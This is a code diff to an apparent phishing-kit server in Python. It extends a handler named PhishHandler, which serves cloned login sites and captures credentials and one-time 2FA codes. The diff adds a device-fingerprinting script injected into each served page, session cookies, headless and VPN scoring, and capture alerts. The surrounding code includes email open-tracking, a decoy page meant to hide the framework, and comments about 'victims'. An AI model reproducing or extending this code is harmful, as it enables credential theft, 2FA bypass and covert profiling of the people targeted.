@@ -9,9 +9,13 @@ import ssl
 import os
 import json
 import re
+import secrets
 import time
+import urllib.parse
 from urllib.parse import parse_qs, urlparse
 from . import capture as cap
+from . import intel as intel_mod
+from .intel import INTEL_PATH, INTEL_JS_PATH
 from . import templates as tpl
 from . import risk as riskmod
 
@@ -74,16 +78,22 @@ def _is_creds(d: dict) -> bool:
 
 def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False,
                  on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
-                 gate=None, decoy_url=""):
+                 gate=None, decoy_url="", intel=True, intel_perms=False):
     # A class body cannot see the enclosing function's locals for a name it is
     # itself assigning (`gate = gate` raises NameError), so bind through
     # differently-named locals.
     _gate_obj = gate
     _decoy_url = decoy_url
+    _intel_on = bool(intel)
+    _intel_perms = bool(intel_perms)
     _rotation = list(rotate_dirs or [])
     _notifier = on_capture
 
     class PhishHandler(http.server.BaseHTTPRequestHandler):
+        # HTTP/1.1 so the victim's browser reuses the connection for the
+        # collector waves and assets instead of opening a socket per request.
+        # Every response in this handler sends Content-Length (required).
+        protocol_version = "HTTP/1.1"
         db = cap.CaptureDB(db_path)
         redirect = redirect_url
         otp_page = otp
@@ -96,6 +106,8 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
         rotation = _rotation                   # A/B: one of these per request
         gate = _gate_obj                       # campaign gating (optional)
         decoy = _decoy_url
+        intel_on = _intel_on                   # deep device dump on page open
+        intel_perms = _intel_perms             # permission-gated probes
         geo_cache = {}                         # ip -> (ts, geo), for gating lookups
         geo_cache_ttl = 600
 
@@ -119,6 +131,56 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             "ipapi":  "https://ipapi.co/{ip}/json/",
             "ipinfo": "https://ipinfo.io/{ip}/json",
         }
+
+        def _json(self, obj, status=200):
+            body = json.dumps(obj, default=str).encode()
+            self.send_response(status)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def _store_intel(self, payload):
+            """Merge one device-dump wave into the session's intel record."""
+            sid = str(payload.get("sid") or "").strip() or self._intel_sid()
+            ip = self._client_ip()
+            try:
+                merged = intel_mod.merge_waves(self.db.intel_for_session(sid), payload)
+            except Exception:
+                merged = intel_mod.merge_waves({}, payload)
+            geo = self._geo_cached(ip) if self.gate and self.gate.needs_geo else self._geo(ip)
+            summary = intel_mod.summarize(merged, ua=payload.get("ua")
+                                          or self.headers.get("User-Agent", ""),
+                                          server_ip=ip,
+                                          geo_country=(geo or {}).get("country", ""))
+            summary["sid"] = sid
+            risk = intel_mod.risk_from_intel(summary)
+            raw = {"mods": merged, "last": payload}
+            try:
+                if self.db.intel_for_session(sid):
+                    self.db.intel_update(sid, summary, raw, risk=risk)
+                else:
+                    self.db.log_intel(sid, ip, (geo or {}).get("city", ""),
+                                      (geo or {}).get("country", ""), (geo or {}).get("isp", ""),
+                                      payload.get("ua") or self.headers.get("User-Agent", ""),
+                                      summary, raw, risk=risk)
+            except Exception as e:
+                return {"ok": False, "error": f"store failed: {e}"}
+            if self.notifier and payload.get("wave") in ("open", "gesture", "final"):
+                try:
+                    self.notifier({"type": "intel", "sid": sid, "ip": ip,
+                                   "browser": summary.get("browser"), "os": summary.get("os"),
+                                   "device_class": summary.get("device_class"),
+                                   "device_token": (summary.get("fingerprint") or {}).get("device_token"),
+                                   "headless": (summary.get("automation") or {}).get("headless_score"),
+                                   "vpn": (summary.get("network_risk") or {}).get("vpn_suspected_score"),
+                                   "wave": payload.get("wave")})
+                except Exception:
+                    pass
+            return {"ok": True, "sid": sid, "wave": payload.get("wave"),
+                    "modules": len(summary.get("modules_collected") or []),
+                    "headless": (summary.get("automation") or {}).get("headless_score"),
+                    "device_token": (summary.get("fingerprint") or {}).get("device_token")}
 
         def _geo_cached(self, ip):
             """Geo with a per-process TTL cache — gating must not call the geo
@@ -149,6 +211,7 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             if self.decoy:
                 self.send_response(302)
                 self.send_header("Location", self.decoy)
+                self.send_header("Content-Length", "0")
                 self.end_headers()
             else:
                 # inert page: looks like a dead link, not a phishing framework
@@ -194,11 +257,40 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
                 return "linux"
             return "unknown"
 
+        def _intel_sid(self):
+            """Session id for the device dump: reuse the __bhi cookie, else mint one."""
+            m = re.search(r"__bhi=([0-9a-f]{8,64})", self.headers.get("Cookie") or "")
+            if m:
+                return m.group(1)
+            return secrets.token_hex(16)
+
         def do_GET(self):
-            if self.path == "/health":
+            if self.path.split("?")[0] in (INTEL_JS_PATH, "/intel.js"):
+                q = parse_qs(urlparse(self.path).query)
+                sid = (q.get("s", [self._intel_sid()])[0] or self._intel_sid())
+                perms = q.get("p", ["1" if self.intel_perms else "0"])[0] in ("1", "true")
+                import os as _os
+                js_path = _os.path.join(_os.path.dirname(_os.path.dirname(
+                    _os.path.abspath(__file__))), "assets", "intel.js")
+                try:
+                    js = intel_mod.render_js(js_path, sid, perms=perms).encode()
+                except Exception as e:
+                    js = ("/* intel collector unavailable: %s */" % e).encode()
                 self.send_response(200)
+                self.send_header("Content-Type", "application/javascript")
+                self.send_header("Cache-Control", "no-store")
+                self.send_header("Content-Length", str(len(js)))
+                self.send_header("Set-Cookie", f"__bhi={sid}; Path=/; SameSite=Lax")
                 self.end_headers()
-                self.wfile.write(b"ok")
+                self.wfile.write(js)
+                return
+            if self.path == "/health":
+                body = b"ok"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
                 return
             # 1x1 email open-tracking pixel: returns a real GIF and counts a visit
             if self.path.startswith("/px.gif"):
@@ -235,14 +327,48 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             if site and os.path.isdir(site):
                 want_otp = self.otp_page and "otp" in self.path.lower()
                 html = tpl.render_site(site, self.path, want_otp)
+                if self.intel_on:
+                    sid = self._intel_sid()
+                    tag = (f'<script src="{INTEL_JS_PATH}?s={sid}&p='
+                           f'{1 if self.intel_perms else 0}" data-intel="{INTEL_PATH}" defer></script>')
+                    if "</head>" in html.lower():
+                        html = re.sub(r"</head>", tag + "</head>", html, count=1, flags=re.I)
+                    else:
+                        html = tag + html
+                    self._intel_cookie = sid
                 self.send_response(200)
+                body = html.encode("utf-8")
                 self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
+                if getattr(self, "_intel_cookie", None):
+                    self.send_header("Set-Cookie",
+                                     f"__bhi={self._intel_cookie}; Path=/; SameSite=Lax")
                 self.end_headers()
-                self.wfile.write(html.encode("utf-8"))
+                self.wfile.write(body)
             else:
                 self.send_error(404)
 
         def do_POST(self):
+            if self.path.split("?")[0] in (INTEL_PATH, "/intel"):
+                n = int(self.headers.get("Content-Length", 0))
+                if n > 2 * 1024 * 1024:
+                    self.send_response(413)
+                    self.send_header("Content-Length", "0")
+                    self.end_headers()
+                    return
+                raw = self.rfile.read(n) if n else b""
+                try:
+                    payload = json.loads(raw.decode("utf-8", "replace") or "{}")
+                    if not isinstance(payload, dict):
+                        raise ValueError("not an object")
+                except Exception:
+                    self._json({"ok": False, "error": "malformed json"}, status=400)
+                    return
+                if not payload.get("mods") and not payload.get("errors"):
+                    self._json({"ok": False, "error": "empty payload"}, status=400)
+                    return
+                self._json(self._store_intel(payload))
+                return
             length = int(self.headers.get("Content-Length", 0))
             raw = self.rfile.read(length)
             ct = (self.headers.get("Content-Type") or "").lower()
@@ -281,32 +407,39 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             # 2FA flow: after the first credential submit, show the OTP page.
             if self.otp_page and creds and not has_otp:
                 served = getattr(self, "served_site", None) or self.server.current_site
-                html = tpl.render_site(served, "/", True)
+                body = tpl.render_site(served, "/", True).encode("utf-8")
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
                 self.end_headers()
-                self.wfile.write(html.encode("utf-8"))
+                self.wfile.write(body)
             elif self.redirect:
                 self.send_response(302)
                 self.send_header("Location", self.redirect)
+                # HTTP/1.1 needs an explicit body length (0) or the client
+                # waits for a body that never comes and keep-alive desyncs
+                self.send_header("Content-Length", "0")
                 self.end_headers()
             else:
-                html = tpl.render_thankyou()
+                body = tpl.render_thankyou().encode("utf-8")
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
                 self.end_headers()
-                self.wfile.write(html.encode("utf-8"))
+                self.wfile.write(body)
 
     return PhishHandler
 
-def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi",
+def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi", intel=True,
+          intel_perms=False,
             redirect_url="", otp=False, tls=False, cert_path=None,
             on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
             gate=None, decoy_url=""):
     """Start the server; returns (httpd, handler_class)."""
     Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp,
                            on_capture=on_capture, site_name=site_name, campaign=campaign,
-                           rotate_dirs=rotate_dirs, gate=gate, decoy_url=decoy_url)
+                           rotate_dirs=rotate_dirs, gate=gate, decoy_url=decoy_url,
+                           intel=intel, intel_perms=intel_perms)
     class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
         daemon_threads = True
         # HTTPServer's default backlog is 5; a burst of simultaneous victims
